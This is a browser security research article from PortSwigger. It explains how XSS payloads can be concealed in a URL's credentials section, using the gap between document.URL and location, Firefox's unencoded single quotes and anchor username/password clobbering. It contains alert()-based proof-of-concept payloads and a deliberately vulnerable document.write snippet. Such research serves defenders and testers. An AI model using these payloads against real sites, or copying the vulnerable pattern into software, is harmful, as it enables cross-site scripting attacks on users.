---
source: portswigger-research
source_url: https://portswigger.net/research/concealing-payloads-in-url-credentials
title: "Concealing payloads in URL credentials | PortSwigger Research"
published: 2024-10-23T12:59:05
description: "Last year Johan Carlsson discovered you could conceal payloads inside the credentials part of the URL . This was fascinating to me especially because the payload is not actually visible in the URL in"
---

# Concealing payloads in URL credentials

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Wednesday, 23 October 2024 at 12:59 UTC

- **Updated:** Wednesday, 23 October 2024 at 14:03 UTC


![A browser window with a payload in the URL and a crossed out eye indicating it's hidden](https://portswigger.net/cms/images/79/ea/ed76-article-article.png)

Last year
[Johan Carlsson](https://x.com/joaxcar) discovered you could
[conceal payloads inside the credentials part of the URL](https://x.com/joaxcar/status/1712858781405577370). This was fascinating to me especially because the payload is not actually visible in the URL in both Chrome and Firefox. This even persists through same origin navigations. So like a dog with a bone I wouldn't let go and tried to see what was possible...

The first surprising thing to me was document.URL does not always match location.

`https://foo:bar@portswigger-labs.net
alert(location);//https://portswigger-labs.net/
alert(document.URL);//https://foo:bar@portswigger-labs.net/
`

I had assumed these two properties were the same since I'd never observed them being different but it turns out that document.URL contains the credentials part of the URL whereas location doesn't. What that means is you can use just URL inside an event grab the payload from the credentials:

`https://alert(1)@portswigger-labs.net
<img src onerror=alert(URL.slice(8,16))>`

[Grab payload from credentials](https://alert(1)@portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%20onerror=alert(URL.slice(8,16))%3E)

After fuzzing to identify which
[characters are encoded in the credentials part of the URL](https://shazzer.co.uk/vectors/66565698b1ba6bb6f9133d13), Shazzer discovered that Firefox doesn't URL-encode single quotes. This is particularly useful in [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) scenarios, if the site removes the query string and hash. As it makes vulnerabilities like this exploitable in Firefox:

``function getBase(url) {
return url.split(/[?#]/)[0];
}
document.write(`<script>const url='${getBase(document.URL)}';<\/script>`);
``

To exploit this you need to provide the payload in the credentials part on Firefox like this:

`https://'-alert(1)-'@example.com`

This can be delivered using redirection or user navigation. You can even use this technique to control the username or password properties of anchor links. This works because every anchor element has these properties, which store the credentials from the URL. If it's a relative link, it inherits the parent credentials, allowing you to clobber these values:

`https://clobbered@example.com
<a href=# onclick=alert(username)>test</a>
`

[Anchor Clobbering example](https://clobbered@portswigger-labs.net/xss/xss.php?x=%3Ca%20href=%23%20onclick=%22alert(username)%22%3Etest%3C/a%3E)

You can combine this with [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) to give you control over objects with username or password properties. Note you can even supply a blank href which still enables control over username or password via the URL.

`
https://user:pass@example.com
<a href id=x>test</a>
<script>
eval(x.username)//user
eval(x.password)//pass
</script>
`

In conclusion, discovering the discrepancies between location and document.URL and how document.URL retains the credentials part of the URL - even when browsers like Chrome and Firefox hide it from the address bar is quite surprising. Firefox’s handling of certain characters, such as single quotes, which are not URL-encoded, could be useful for DOM XSS too.

The ability to conceal payloads through credentials, manipulate the username and password properties within anchor elements, and potentially combine this with DOM clobbering can be used for more advanced exploitation.

**Note:** Safari discards URL credentials. All the examples shown only work on Chrome and Firefox. Also Chrome blocks sub-resources from using URL credentials.

[XSS](https://portswigger.net/research/cross-site-scripting-research) [DOM Clobbering](https://portswigger.net/research/dom-clobbering) [DOM](https://portswigger.net/research/dom)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Exploiting XSS in hidden inputs and meta tags** 11 July 2023Exploiting XSS in hidden inputs and meta tags](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)